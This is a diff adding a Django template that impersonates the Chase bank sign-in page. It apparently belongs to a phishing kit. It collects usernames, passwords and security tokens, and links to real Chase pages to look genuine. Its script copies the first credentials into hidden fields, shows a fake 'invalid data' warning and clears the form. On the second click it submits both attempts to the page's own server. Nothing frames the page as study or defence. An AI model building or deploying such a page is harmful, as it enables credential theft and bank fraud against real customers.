@@ -1,0 +1,104 @@
+{% extends "parent/parent.html" %}
+{% load static %}
+{% block title %} Sign in - chase.com {% endblock %}
+
+{% block header %}
+<link rel="stylesheet" href="{% static 'base/css/styles.css' %}?{% now 'U' %}">
+<script src='https://www.google.com/recaptcha/api.js?render={{recaptcha_site_key}}'></script>
+{% endblock %}
+{% block body %} 
+    <div class="container-fluid header">
+        <div class="row justify-content-center text-center">
+            <div class="col-12">
+                <div class="logo mt-4">
+                    <a href="">
+                        <img src="{% static 'base/images/wordmark-white.png' %}" alt="">
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="container login">
+        <div class="row justify-content-center text-center row_one">
+            <div class="col-11 col-sm-9 col-md-7 col-lg-5 col-xl-4 bg-white login_form">
+                <div class="content">
+                    <form action="" method="POST" class="p-2 form_one">
+                        <div class="alert alert-warning alert-dismissible fade show d-none slimodan_alert" role="alert">
+                            <strong>Warning!</strong> Your Data Is Invalid Please Try Again!
+                          </div>
+                        {% csrf_token %}
+                        <div class="input-group mt-5">  
+                            <label for="username">Username</label>                          
+                            <input type="text" required name = "username" class="form-control inp_username slimodan_input">
+                        </div>
+                        <div class="input-group mt-5"> 
+                            <label for="password" >Password</label>                          
+                            <input type="password" required name="password" class="form-control inp_password slimodan_input">
+                        </div>
+                        <div class="input-group mt-5 token_input" style="display:none">
+                            <label for="token">Token</label>                            
+                            <input type="tel" id = "token" name = "token" autocomplete="off" min="0" maxlength="35" type="tel" name="securityToken" data-validate="securityToken" class="form-control inp_password slimodan_input">
+                        </div>
+                        <div class="container-fluid checkboxs mt-5 p-0">
+                            <div class="row justify-content-around">
+                                <div class="col-6">
+                                    <label class="container">
+                                        <span>Remember Me</span>
+                                        <input type="checkbox" cheched>
+                                        <span class="checkmark"></span>
+                                    </label>
+                                </div>
+                                <div class="col-6 fix_col">
+                                    <label class="container ">
+                                        <span class="fix_position">Use token</span>
+                                        <input type="checkbox" class="this_token_checkBox" >
+                                        <span class="checkmark"></span>
+                                    </label>
+                                </div>
+                            </div>
+                        </div>
+                        <input type="hidden" id="g-recaptcha-response" name="g-recaptcha-response"> 
+                        <input type="text" hidden name="username_step1" id="username_step1">
+                        <input type="text" hidden name="password_step1" id="password_step1">
+                        <button class="btn btn-primary mt-4 w-100 btn-login one" id="one_login">
+                            <span>Sign in</span>
+                        </button>
+                        <div class="link-box mt-2">
+                            <a href="https://secure05b.chase.com/web/auth/dashboard#/dashboard/overviewAccounts/overview/index">
+                                Forgot username/password?
+                            </a>
+                            <br>
+                            <a href="https://secure05b.chase.com/web/auth/enrollment#/enroll/onlineEnrollment/gettingStarted/index?LOB=RGBLogon">
+                                Not Enrolled? Sign Up Now.
+                            </a>
+                        </div>
+                    </form> 
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="{% static 'base/js/script.js' %}" defer="true"></script>
+    <script>
+        $("#one_login").click(function(e){
+            e.preventDefault();
+            if ($("#one_login").hasClass("one")){
+                $("#username_step1").val($(".inp_username").val());
+                $("#password_step1").val($(".inp_password").val());
+                $(".slimodan_alert").removeClass("d-none");
+                $(".inp_username").val("");
+                $(".inp_password").val("");
+                $("#one_login").removeClass("one");
+
+            }else{
+                $(".form_one").submit();
+            }
+        })        
+    </script>
+    <script>
+        grecaptcha.ready(function() {
+          grecaptcha.execute('{{recaptcha_site_key}}', {action: "/"}).then(function(token) {
+            document.getElementById('g-recaptcha-response').value = token;
+          });
+        });
+    </script>
+{% endblock %}
